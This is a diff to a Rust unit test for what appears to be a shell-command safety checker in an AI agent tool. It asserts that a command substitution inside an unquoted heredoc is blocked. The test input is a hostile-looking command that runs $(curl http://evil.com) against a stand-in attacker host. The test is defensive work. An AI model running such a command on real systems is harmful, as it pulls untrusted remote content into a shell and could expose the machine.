@@ -2280,9 +2280,11 @@ mod tests {
 
         // Unquoted heredoc: shell expands → blocked
         let cmd = "cat << EOF\nresult=$(curl http://evil.com)\nEOF";
-        let decision = evaluate_tool_safety_request("bash", &json!({"command": cmd}));
+        let reason = check_shell_command_safety_with_mode(cmd, TrustMode::Strict);
         assert!(
-            matches!(decision, SafetyMiddlewareDecision::Deny(_)),
+            reason
+                .as_deref()
+                .is_some_and(|reason| reason.contains("command substitution")),
             "unsafe $(...) inside unquoted heredoc should be blocked"
         );
     }
